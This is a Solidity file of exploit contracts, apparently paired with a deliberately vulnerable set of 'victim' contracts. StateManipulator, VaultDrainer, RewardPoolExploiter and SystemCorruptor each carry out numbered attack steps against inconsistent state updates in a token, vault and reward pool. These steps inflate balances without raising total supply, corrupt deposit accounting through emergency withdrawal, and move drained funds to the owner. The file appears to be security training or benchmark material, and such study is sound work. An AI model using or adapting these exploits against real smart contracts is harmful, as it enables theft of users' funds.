// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./Inconsistent_State_Update_Victim.sol";

/**
 * @title StateManipulator
 * @notice Exploits inconsistent state updates in InconsistentStateToken
 */
contract StateManipulator {
    InconsistentStateToken public token;
    address public owner;
    
    event AttackInitiated(string step);
    event StateCorrupted(uint256 balanceSum, uint256 totalSupply);
    event ProfitExtracted(uint256 amount);
    
    constructor(address _token) {
        token = InconsistentStateToken(_token);
        owner = msg.sender;
    }
    
    // ATTACK STEP 1: Exploit rescueCredit to inflate balance without totalSupply
    function exploitRescueCredit(uint256 amount) external {
        require(msg.sender == owner, "not owner");
        
        emit AttackInitiated("Exploiting rescueCredit");
        
        // This will increase balance but not totalSupply
        token.rescueCredit(address(this), amount);
        
        uint256 myBalance = token.balances(address(this));
        uint256 supply = token.totalSupply();
        
        emit StateCorrupted(myBalance, supply);
    }
    
    // ATTACK STEP 2: Transfer inflated balance to create phantom tokens
    function transferPhantomTokens(address to, uint256 amount) external {
        require(msg.sender == owner, "not owner");
        
        token.transfer(to, amount);
        emit AttackInitiated("Transferred phantom tokens");
    }
    
    // Receive function to accept ETH
    receive() external payable {}
}

/**
 * @title VaultDrainer
 * @notice Exploits inconsistent state in InconsistentVault
 */
contract VaultDrainer {
    InconsistentVault public vault;
    address public owner;
    
    event AttackExecuted(string step, uint256 amount);
    event VaultCorrupted(uint256 totalDeposits, uint256 actualBalance);
    
    constructor(address payable _vault) {
        vault = InconsistentVault(_vault);
        owner = msg.sender;
    }
    
    // ATTACK STEP 1: Deposit funds normally
    function depositToVault() external payable {
        require(msg.sender == owner, "not owner");
        vault.deposit{value: msg.value}();
        emit AttackExecuted("Deposited to vault", msg.value);
    }
    
    // ATTACK STEP 2: Use emergency withdraw to corrupt totalDeposits
    function exploitEmergencyWithdraw() external {
        require(msg.sender == owner, "not owner");
        
        uint256 balanceBefore = vault.totalDeposits();
        
        // This will set deposits[this] = 0 but won't update totalDeposits
        vault.emergencyWithdraw();
        
        uint256 balanceAfter = vault.totalDeposits();
        uint256 actualBalance = vault.getBalance();
        
        emit VaultCorrupted(balanceAfter, actualBalance);
        emit AttackExecuted("Emergency withdraw exploited", balanceBefore - balanceAfter);
    }
    
    // ATTACK STEP 3: Re-deposit and withdraw to exploit inconsistent state
    function reDepositAndDrain() external payable {
        require(msg.sender == owner, "not owner");
        
        // Deposit again
        vault.deposit{value: msg.value}();
        
        // Now totalDeposits is inflated from previous emergency withdraw
        // We can potentially withdraw more than we should
        uint256 myDeposit = vault.deposits(address(this));
        vault.withdraw(myDeposit);
        
        emit AttackExecuted("Re-deposited and drained", myDeposit);
    }
    
    function extractProfit() external {
        require(msg.sender == owner, "not owner");
        uint256 balance = address(this).balance;
        payable(owner).transfer(balance);
    }
    
    receive() external payable {}
}

/**
 * @title RewardPoolExploiter
 * @notice Exploits inconsistent reward calculations in InconsistentRewardPool
 */
contract RewardPoolExploiter {
    InconsistentRewardPool public pool;
    address public owner;
    
    event AttackStep(string description, uint256 value);
    event RewardClaimed(uint256 amount);
    event SystemState(uint256 rewardBalance, uint256 contractBalance);
    
    constructor(address payable _pool) {
        pool = InconsistentRewardPool(_pool);
        owner = msg.sender;
    }
    
    // ATTACK STEP 1: Stake funds
    function stakeInPool() external payable {
        require(msg.sender == owner, "not owner");
        pool.stake{value: msg.value}();
        emit AttackStep("Staked in pool", msg.value);
    }
    
    // ATTACK STEP 2: Admin adds rewards but forgets to update rewardPerToken
    // This creates opportunity for exploitation
    function triggerInconsistentReward() external payable {
        require(msg.sender == owner, "not owner");
        
        // Add reward without proper rewardPerToken update
        pool.addReward{value: msg.value}();
        
        uint256 rewardBalance = pool.rewardBalance();
        uint256 contractBalance = pool.getContractBalance();
        
        emit SystemState(rewardBalance, contractBalance);
    }
    
    // ATTACK STEP 3: Claim rewards (will fail or give wrong amount due to inconsistent state)
    function attemptClaimReward() external {
        require(msg.sender == owner, "not owner");
        
        try pool.claimReward() {
            emit AttackStep("Reward claimed successfully", 0);
        } catch {
            emit AttackStep("Reward claim failed due to inconsistent state", 0);
        }
    }
    
    // ATTACK STEP 4: Unstake to extract value
    function unstakeAndProfit() external {
        require(msg.sender == owner, "not owner");
        
        uint256 staked = pool.stakes(address(this));
        if (staked > 0) {
            pool.unstake(staked);
            emit AttackStep("Unstaked", staked);
        }
        
        // Extract any balance
        uint256 balance = address(this).balance;
        if (balance > 0) {
            payable(owner).transfer(balance);
            emit AttackStep("Extracted profit", balance);
        }
    }
    
    receive() external payable {
        emit RewardClaimed(msg.value);
    }
}

/**
 * @title SystemCorruptor
 * @notice Exploits cascading state corruption across the system
 */
contract SystemCorruptor {
    StateCorruptionSystem public system;
    address public owner;
    
    event SystemCompromised(string vulnerability);
    event CascadingFailure(uint256 step, string description);
    
    constructor(address _system) {
        system = StateCorruptionSystem(_system);
        owner = msg.sender;
    }
    
    // ATTACK: Corrupt all subsystems
    function corruptEntireSystem() external {
        require(msg.sender == owner, "not owner");
        
        // Step 1: Corrupt token state
        InconsistentStateToken token = system.token();
        token.rescueCredit(address(this), 1000 ether);
        emit CascadingFailure(1, "Token state corrupted via rescueCredit");
        
        // Step 2: Health check will now show system as unhealthy
        system.checkSystemHealth();
        emit CascadingFailure(2, "System health check shows corruption");
        
        bool healthy = system.systemHealthy();
        if (!healthy) {
            emit SystemCompromised("Entire system state corrupted");
        }
    }
    
    // Demonstrate that state corruption prevents proper recovery
    function demonstrateUnrecoverableState() external view returns (
        uint256 tokenSupply,
        uint256 vaultDeposits,
        uint256 poolStaked,
        bool systemHealthy
    ) {
        InconsistentStateToken token = system.token();
        InconsistentVault vault = system.vault();
        InconsistentRewardPool pool = system.rewardPool();
        
        tokenSupply = token.totalSupply();
        vaultDeposits = vault.totalDeposits();
        poolStaked = pool.totalStaked();
        systemHealthy = system.systemHealthy();
    }
    
    receive() external payable {}
}
